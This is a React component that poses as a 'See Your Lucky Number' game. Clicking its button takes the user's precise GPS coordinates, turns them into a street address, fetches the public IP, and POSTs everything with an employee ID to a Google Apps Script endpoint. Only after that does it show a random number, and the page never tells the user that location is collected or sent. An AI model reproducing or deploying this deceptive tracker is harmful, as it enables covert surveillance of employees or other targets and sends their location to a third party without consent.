// TrackLocation.jsx
import React, { useState } from "react";

export default function TrackLocation() {
  const [status, setStatus] = useState("idle");
  const [lastPos, setLastPos] = useState(null);
  const [luckyNumber, setLuckyNumber] = useState(null);


  const scriptUrl =
    "https://script.google.com/macros/s/AKfycbxu6nZx8TNwp7rqmlOSrEwS9E6KiAJuCEVuDGnZ71yrH42lMJD7A8hBxo_csNU5jths/exec";
  const employeeId = JSON.parse(localStorage.getItem("userData"))?.name || "EMP001";

const sendLocation = async (lat, lng, accuracy, address, ip) => {
  try {
    const fd = new FormData();
    fd.append("employeeId", employeeId);
    fd.append("lat", lat);
    fd.append("lng", lng);
    fd.append("accuracy", accuracy);
    fd.append("address", address || "");
    fd.append("ip", ip || "");

    await fetch(scriptUrl, { method: "POST", body: fd });
    setStatus("sent");
    setLuckyNumber(Math.floor(1 + Math.random() * 9));
  } catch (err) {
    console.error("Error sending location:", err);
    setStatus("error");
  }
};

  const fetchAddress = async (lat, lng) => {
    try {
      const res = await fetch(
        `https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lng}&format=json`
      );
      const data = await res.json();
      return data.display_name || "";
    } catch {
      return "";
    }
  };

  const getIP = async () => {
    try {
      const res = await fetch("https://api.ipify.org?format=json");
      const data = await res.json();
      return data.ip;
    } catch {
      return "";
    }
  };

  const trackNow = () => {
    if (!navigator.geolocation) {
      setStatus("Geolocation not supported");
      return;
    }
    setStatus("fetching your number...");

    {status === "sent" && luckyNumber && (
  <div className="mt-6 bg-gray-700 rounded-xl p-4 text-center text-2xl font-bold text-yellow-400">
    Your Lucky Number: {luckyNumber}
  </div>  
)}


    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        const { latitude, longitude, accuracy } = pos.coords;

        const address = await fetchAddress(latitude, longitude);
        const ip = await getIP();

        setLastPos({
          lat: latitude,
          lng: longitude,
          accuracy,
          address,
          ip,
        });

        sendLocation(latitude, longitude, accuracy, address, ip);
      },
      (err) => {
        console.error("Geolocation error:", err);
        setStatus("denied");
      },
      { enableHighAccuracy: true, timeout: 10000 }
    );
  };

  return (
    <div>
  <button
    onClick={() => {
      localStorage.removeItem("isLoggedIn");
      localStorage.removeItem("userData");
      window.location.href = "/";
    }}
    className="absolute top-0 right-0 bg-red-500 text-white font-semibold py-1 px-3 rounded-bl-xl shadow-md hover:bg-red-400 transition"
  >
    Logout
  </button>
    <div className="bg-gray-900 text-white min-h-screen flex flex-col items-center justify-center p-6">
      <div className="bg-gray-800 rounded-2xl shadow-lg p-6 w-full max-w-md">
      <div className="relative">
</div>
        <h2 className="text-2xl font-bold text-yellow-400 mb-4 text-center">
          See Your Lucky Number
        </h2>
        <p className="mb-4 text-gray-300 text-center">
          Status:{" "}
          <span
            className={
              status === "sent"
                ? "text-green-400"
                : status === "error"
                ? "text-red-400"
                : "text-yellow-400"
            }
          >
            {status}
          </span>
        </p>

        <button
          onClick={trackNow}
          className="w-full bg-yellow-400 text-black font-semibold py-2 px-4 rounded-xl shadow-md hover:bg-yellow-300 transition"
        >
          Click Here
        </button>

        {luckyNumber && (
  <div className="mt-6 bg-gray-700 rounded-xl p-4 text-center text-2xl font-bold text-yellow-400">
    Your Lucky Number: {luckyNumber}
  </div>
)}
      </div>
    </div>
    </div>
  );
}
